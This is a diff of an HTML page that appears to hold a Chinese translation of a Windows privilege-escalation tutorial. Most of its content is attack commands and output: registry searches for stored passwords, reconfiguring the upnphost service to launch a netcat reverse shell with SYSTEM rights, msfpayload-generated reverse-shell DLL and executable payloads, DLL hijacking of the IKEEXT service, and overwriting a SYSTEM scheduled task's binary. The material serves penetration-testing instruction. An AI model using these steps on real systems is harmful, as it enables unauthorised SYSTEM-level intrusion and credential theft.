-<p>我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在<a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx" target="_blank" rel="noopener">此处</a>从Microsoft technet下载该套件。</p>
+C:\Windows\system32&gt; reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
+C:\Windows\system32&gt; reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="Δt-for-t7-to-t10-卷起你的袖子"><a href="#Δt-for-t7-to-t10-卷起你的袖子" class="headerlink" title="Δt for t7 to t10 - 卷起你的袖子"></a>Δt for t7 to t10 - 卷起你的袖子</h2><p>  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。</p>
+<p>我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在<a target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">此处</a>从Microsoft technet下载该套件。</p>
 <p>我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子  </p>
-<pre><code># We can use sc to query, configure and manage windows services.
+<pre class="line-numbers language-none"><code class="language-none"># We can use sc to query, configure and manage windows services.
 
 C:\Windows\system32&gt; sc qc Spooler
 
@@ -767,9 +802,10 @@ SERVICE_NAME: Spooler
         DISPLAY_NAME       : Print Spooler
         DEPENDENCIES       : RPCSS
                            : http
-        SERVICE_START_NAME : LocalSystem
-</code></pre><p>我们可以使用accesschk检查每个服务所需的权限级别。</p>
-<pre><code># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list
+        SERVICE_START_NAME : LocalSystem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以使用accesschk检查每个服务所需的权限级别。</p>
+<pre class="line-numbers language-none"><code class="language-none"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list
 all services.
 
 C:\&gt; accesschk.exe -ucqv Spooler
@@ -794,10 +830,11 @@ Spooler
   RW BUILTIN\Administrators
         SERVICE_ALL_ACCESS
   RW NT AUTHORITY\SYSTEM
-        SERVICE_ALL_ACCESS
-</code></pre><p>   Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。</p>
+        SERVICE_ALL_ACCESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>   Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。</p>
 <p>让我们比较Windows 8和Windows XP SP0上的输出。  </p>
-<pre><code># This is on Windows 8.
+<pre class="line-numbers language-none"><code class="language-none"># This is on Windows 8.
 
 C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
 No matching objects found.
@@ -809,7 +846,7 @@ RW SSDPSRV
         SERVICE_ALL_ACCESS
 RW upnphost
         SERVICE_ALL_ACCESS
-
+		
 C:\&gt; accesschk.exe -ucqv SSDPSRV
 
 SSDPSRV
@@ -838,10 +875,13 @@ upnphost
   RW BUILTIN\Power Users
         SERVICE_ALL_ACCESS
   RW NT AUTHORITY\LOCAL SERVICE
-        SERVICE_ALL_ACCESS
-</code></pre><p>  此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。</p>
+        SERVICE_ALL_ACCESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>  此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。</p>
 <p>我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。  </p>
-<pre><code>C:\&gt; sc qc upnphost
+<pre class="line-numbers language-none"><code class="language-none">C:\&gt; sc qc upnphost
 
 [SC] GetServiceConfig SUCCESS
 
@@ -855,11 +895,11 @@ SERVICE_NAME: upnphost
         DISPLAY_NAME       : Universal Plug and Play Device Host
         DEPENDENCIES       : SSDPSRV
         SERVICE_START_NAME : NT AUTHORITY\LocalService
-
-C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;
+		
+C:\&gt; sc config upnphost binpath&#x3D; &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;
 [SC] ChangeServiceConfig SUCCESS
 
-C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+C:\&gt; sc config upnphost obj&#x3D; &quot;.\LocalSystem&quot; password&#x3D; &quot;&quot;
 [SC] ChangeServiceConfig SUCCESS
 
 C:\&gt; sc qc upnphost
@@ -876,24 +916,27 @@ SERVICE_NAME: upnphost
         DISPLAY_NAME       : Universal Plug and Play Device Host
         DEPENDENCIES       : SSDPSRV
         SERVICE_START_NAME : LocalSystem
-
+		
 C:\&gt; net start upnphost
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv01_big.png" alt="img"></p>
+
+
+<p><img src="http://www.fuzzysecurity.com/tutorials/images/priv01_big.png" alt="img"></p>
 <p>Service Shell (upnphost)</p>
 <p>即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt="img"></p>
 <p>  需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。</p>
-<p>Power in Power用户（Mark Russinovich） - <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx" target="_blank" rel="noopener">这里</a></p>
+<p>Power in Power用户（Mark Russinovich） - <a target="_blank" rel="noopener" href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">这里</a></p>
 <p>最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。</p>
-<p>对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">在这里</a>阅读他的帖子。</p>
+<p>对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你<a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=738">在这里</a>阅读他的帖子。</p>
 <p>此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。</p>
 <p>通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。</p>
 <p>您可以在以下32位系统上看到DLL搜索顺序：<br>1 - 应用程序加载的目录<br>2 - 32位系统目录（C：\ Windows \ System32）<br>3 - 16位系统目录（C：\ Windows \ System）<br>4 - Windows目录（C：\ Windows）<br>5 - 当前工作目录（CWD）<br>6 - PATH环境变量中的目录（系统然后用户）</p>
 <p>有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。</p>
 <p>由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。</p>
 <p>让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。  </p>
-<pre><code># This is on Windows 7 as low privilege user1.
+<pre class="line-numbers language-none"><code class="language-none"># This is on Windows 7 as low privilege user1.
 
 C:\Users\user1\Desktop&gt; echo %username%
 
@@ -901,7 +944,7 @@ user1
 
 # We have a win here since any non-default directory in &quot;C:\&quot; will give write access to authenticated
 users.
-
+		
 C:\Users\user1\Desktop&gt; echo %path%
 
 C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
@@ -946,10 +989,10 @@ C:\Python27 BUILTIN\Administrators:(ID)F
             BUILTIN\Users:(OI)(CI)(ID)R
             NT AUTHORITY\Authenticated Users:(ID)C
             NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
-
+			
 # Before we go over to action we need to check the status of the IKEEXT service. In this case we can see
 it is set to &quot;AUTO_START&quot; so it will launch on boot!
-
+		
 C:\Users\user1\Desktop&gt; sc qc IKEEXT
 
 [SC] QueryServiceConfig SUCCESS
@@ -964,12 +1007,15 @@ SERVICE_NAME: IKEEXT
         DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
         DEPENDENCIES       : BFE
         SERVICE_START_NAME : LocalSystem
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！</p>
-<pre><code>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#39;127.0.0.1&#39; lport=&#39;9988&#39; O
+
+
+<p>现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！</p>
+<pre class="line-numbers language-none"><code class="language-none">root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; O
 
        Name: Windows Command Shell, Reverse TCP Inline
-     Module: payload/windows/shell_reverse_tcp
+     Module: payload&#x2F;windows&#x2F;shell_reverse_tcp
    Platform: Windows
        Arch: x86
 Needs Admin: No
@@ -990,16 +1036,19 @@ LPORT     9988             yes       The listen port
 Description:
   Connect back to attacker and spawn a command shell
 
-root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#39;127.0.0.1&#39; lport=&#39;9988&#39; D &gt; 
-/root/Desktop/evil.dll
+root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; D &gt; 
+&#x2F;root&#x2F;Desktop&#x2F;evil.dll
 
-Created by msfpayload (http://www.metasploit.com).
-Payload: windows/shell_reverse_tcp
+Created by msfpayload (http:&#x2F;&#x2F;www.metasploit.com).
+Payload: windows&#x2F;shell_reverse_tcp
  Length: 314
-Options: {&quot;lhost&quot;=&gt;&quot;127.0.0.1&quot;, &quot;lport&quot;=&gt;&quot;9988&quot;}
+Options: &#123;&quot;lhost&quot;&#x3D;&gt;&quot;127.0.0.1&quot;, &quot;lport&quot;&#x3D;&gt;&quot;9988&quot;&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。</p>
-<pre><code># Again, this is as low privilege user1.
+
+
+<p>将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。</p>
+<pre class="line-numbers language-none"><code class="language-none"># Again, this is as low privilege user1.
 
 C:\Users\user1\Desktop&gt; dir
 
@@ -1008,21 +1057,21 @@ C:\Users\user1\Desktop&gt; dir
 
  Directory of C:\Users\user1\Desktop
 
-02/18/2014  01:49 PM    &lt;DIR&gt;          .
-02/18/2014  01:49 PM    &lt;DIR&gt;          ..
-04/22/2013  09:39 AM           331,888 accesschk.exe
-02/18/2014  12:38 PM            14,336 evil.dll
-01/25/2014  12:46 AM            36,864 fubar.exe
-01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
-06/30/2011  01:52 PM         1,667,584 ncat.exe
-11/22/2013  07:39 PM             1,225 wmic_info.bat
+02&#x2F;18&#x2F;2014  01:49 PM    &lt;DIR&gt;          .
+02&#x2F;18&#x2F;2014  01:49 PM    &lt;DIR&gt;          ..
+04&#x2F;22&#x2F;2013  09:39 AM           331,888 accesschk.exe
+02&#x2F;18&#x2F;2014  12:38 PM            14,336 evil.dll
+01&#x2F;25&#x2F;2014  12:46 AM            36,864 fubar.exe
+01&#x2F;22&#x2F;2014  08:17 AM    &lt;DIR&gt;          incognito2
+06&#x2F;30&#x2F;2011  01:52 PM         1,667,584 ncat.exe
+11&#x2F;22&#x2F;2013  07:39 PM             1,225 wmic_info.bat
                5 File(s)      2,051,897 bytes
                3 Dir(s)      73,052,160 bytes free
 
 C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll
 
         1 file(s) copied.
-
+		
 C:\Users\user1\Desktop&gt; dir C:\Python27
 
  Volume in drive C has no label.
@@ -1030,40 +1079,41 @@ C:\Users\user1\Desktop&gt; dir C:\Python27
 
  Directory of C:\Python27
 
-02/18/2014  01:53 PM    &lt;DIR&gt;          .
-02/18/2014  01:53 PM    &lt;DIR&gt;          ..
-10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs
-10/20/2012  02:52 AM    &lt;DIR&gt;          Doc
-10/20/2012  02:52 AM    &lt;DIR&gt;          include
-01/28/2014  03:45 AM    &lt;DIR&gt;          Lib
-10/20/2012  02:52 AM    &lt;DIR&gt;          libs
-04/10/2012  11:34 PM            40,092 LICENSE.txt
-04/10/2012  11:18 PM           310,875 NEWS.txt
-04/10/2012  11:31 PM            26,624 python.exe
-04/10/2012  11:31 PM            27,136 pythonw.exe
-04/10/2012  11:18 PM            54,973 README.txt
-10/20/2012  02:52 AM    &lt;DIR&gt;          tcl
-10/20/2012  02:52 AM    &lt;DIR&gt;          Tools
-04/10/2012  11:31 PM            49,664 w9xpopen.exe
-02/18/2014  12:38 PM            14,336 wlbsctrl.dll
+02&#x2F;18&#x2F;2014  01:53 PM    &lt;DIR&gt;          .
+02&#x2F;18&#x2F;2014  01:53 PM    &lt;DIR&gt;          ..
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          DLLs
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          Doc
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          include
+01&#x2F;28&#x2F;2014  03:45 AM    &lt;DIR&gt;          Lib
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          libs
+04&#x2F;10&#x2F;2012  11:34 PM            40,092 LICENSE.txt
+04&#x2F;10&#x2F;2012  11:18 PM           310,875 NEWS.txt
+04&#x2F;10&#x2F;2012  11:31 PM            26,624 python.exe
+04&#x2F;10&#x2F;2012  11:31 PM            27,136 pythonw.exe
+04&#x2F;10&#x2F;2012  11:18 PM            54,973 README.txt
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          tcl
+10&#x2F;20&#x2F;2012  02:52 AM    &lt;DIR&gt;          Tools
+04&#x2F;10&#x2F;2012  11:31 PM            49,664 w9xpopen.exe
+02&#x2F;18&#x2F;2014  12:38 PM            14,336 wlbsctrl.dll
                7 File(s)        523,700 bytes
                9 Dir(s)      73,035,776 bytes free
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。</p>
+<p>一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。</p>
 <p>[<img src="http://www.fuzzysecurity.com/tutorials/images/priv03_big.png" alt="img"></p>
 <p>Service Shell (IKEEXT)</p>
 <p>对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。</p>
-<pre><code>HostName:                             B33F
+<pre class="line-numbers language-none"><code class="language-none">HostName:                             B33F
 TaskName:                             \LogGrabberTFTP
-Next Run Time:                        2/19/2014 9:00:00 AM
+Next Run Time:                        2&#x2F;19&#x2F;2014 9:00:00 AM
 Status:                               Ready
-Logon Mode:                           Interactive/Background
-Last Run Time:                        N/A
+Logon Mode:                           Interactive&#x2F;Background
+Last Run Time:                        N&#x2F;A
 Last Result:                          1
 Author:                               B33F\b33f
 Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt
-Start In:                             N/A
-Comment:                              N/A
+Start In:                             N&#x2F;A
+Comment:                              N&#x2F;A
 Scheduled Task State:                 Enabled
 Idle Time:                            Disabled
 Power Management:                     Stop On Battery Mode, No Start On Batteries
@@ -1073,17 +1123,18 @@ Stop Task If Runs X Hours and X Mins: 72:00:00
 Schedule:                             Scheduling data is not available in this format.
 Schedule Type:                        Daily
 Start Time:                           9:00:00 AM
-Start Date:                           2/17/2014
-End Date:                             N/A
+Start Date:                           2&#x2F;17&#x2F;2014
+End Date:                             N&#x2F;A
 Days:                                 Every 1 day(s)
-Months:                               N/A
+Months:                               N&#x2F;A
 Repeat: Every:                        Disabled
 Repeat: Until: Time:                  Disabled
 Repeat: Until: Duration:              Disabled
 Repeat: Stop If Still Running:        Disabled
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。</p>
-<pre><code>C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;E:\GrabLogs&quot;
+<p>盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;E:\GrabLogs&quot;
 
 E:\GrabLogs
   Medium Mandatory Level (Default) [No-Write-Up]
@@ -1110,7 +1161,7 @@ E:\GrabLogs
         FILE_TRAVERSE
         SYNCHRONIZE
         READ_CONTROL
-
+		
 C:\Users\user1\Desktop&gt; dir &quot;E:\GrabLogs&quot;
 
  Volume in drive E is More
@@ -1118,18 +1169,19 @@ C:\Users\user1\Desktop&gt; dir &quot;E:\GrabLogs&quot;
 
  Directory of E:\GrabLogs
 
-02/18/2014  11:34 PM    &lt;DIR&gt;          .
-02/18/2014  11:34 PM    &lt;DIR&gt;          ..
-02/18/2014  11:34 PM    &lt;DIR&gt;          Logs
-02/18/2014  09:21 PM           180,736 tftp.exe
+02&#x2F;18&#x2F;2014  11:34 PM    &lt;DIR&gt;          .
+02&#x2F;18&#x2F;2014  11:34 PM    &lt;DIR&gt;          ..
+02&#x2F;18&#x2F;2014  11:34 PM    &lt;DIR&gt;          Logs
+02&#x2F;18&#x2F;2014  09:21 PM           180,736 tftp.exe
                1 File(s)        180,736 bytes
                3 Dir(s)   5,454,602,240 bytes free
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。</p>
-<pre><code>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#39;127.0.0.1&#39; lport=&#39;9988&#39; O
+<p>显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; O
 
        Name: Windows Command Shell, Reverse TCP Inline
-     Module: payload/windows/shell_reverse_tcp
+     Module: payload&#x2F;windows&#x2F;shell_reverse_tcp
    Platform: Windows
        Arch: x86
 Needs Admin: No
@@ -1150,46 +1202,48 @@ LPORT     9988             yes       The listen port
 Description:
   Connect back to attacker and spawn a command shell
 
-root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#39;127.0.0.1&#39; lport=&#39;9988&#39; R | msfencode -t
-exe &gt; /root/Desktop/evil-tftp.exe
+root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; R | msfencode -t
+exe &gt; &#x2F;root&#x2F;Desktop&#x2F;evil-tftp.exe
 
-[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
+[*] x86&#x2F;shikata_ga_nai succeeded with size 341 (iteration&#x3D;1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。</p>
-<pre><code>C:\Users\user1\Desktop&gt; dir
+<p>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\user1\Desktop&gt; dir
 
  Volume in drive C has no label.
  Volume Serial Number is 948D-A98F
 
  Directory of C:\Users\user1\Desktop
 
-02/19/2014  01:36 AM    &lt;DIR&gt;          .
-02/19/2014  01:36 AM    &lt;DIR&gt;          ..
-04/22/2013  09:39 AM           331,888 accesschk.exe
-02/19/2014  01:31 AM            73,802 evil-tftp.exe
-01/25/2014  12:46 AM            36,864 fubar.exe
-01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
-06/30/2011  01:52 PM         1,667,584 ncat.exe
-02/18/2014  12:38 PM            14,336 wlbsctrl.dll
-11/22/2013  07:39 PM             1,225 wmic_info.bat
+02&#x2F;19&#x2F;2014  01:36 AM    &lt;DIR&gt;          .
+02&#x2F;19&#x2F;2014  01:36 AM    &lt;DIR&gt;          ..
+04&#x2F;22&#x2F;2013  09:39 AM           331,888 accesschk.exe
+02&#x2F;19&#x2F;2014  01:31 AM            73,802 evil-tftp.exe
+01&#x2F;25&#x2F;2014  12:46 AM            36,864 fubar.exe
+01&#x2F;22&#x2F;2014  08:17 AM    &lt;DIR&gt;          incognito2
+06&#x2F;30&#x2F;2011  01:52 PM         1,667,584 ncat.exe
+02&#x2F;18&#x2F;2014  12:38 PM            14,336 wlbsctrl.dll
+11&#x2F;22&#x2F;2013  07:39 PM             1,225 wmic_info.bat
                6 File(s)      2,125,699 bytes
                3 Dir(s)      75,341,824 bytes free
-
+		
 C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe
 
-Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes
+Overwrite E:\GrabLogs\tftp.exe? (Yes&#x2F;No&#x2F;All): Yes
         1 file(s) copied.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。</p>
+<p>为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv04_big.png" alt="img"></p>
 <p>Schtasks Shell (LogGrabberTFTP)</p>
 <p>  这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。</p>
 <p>我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。  </p>
-<pre><code># When executing any of the sysinternals tools for the first time the user will be presented with a GUI
+<pre class="line-numbers language-none"><code class="language-none"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI
 pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
 to automatically accept the EULA.
 
-accesschk.exe /accepteula ... ... ...
+accesschk.exe &#x2F;accepteula ... ... ...
 
 # Find all weak folder permissions per drive.
 accesschk.exe -uwdqs Users c:\
@@ -1198,8 +1252,11 @@ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\
 # Find all weak file permissions per drive.
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
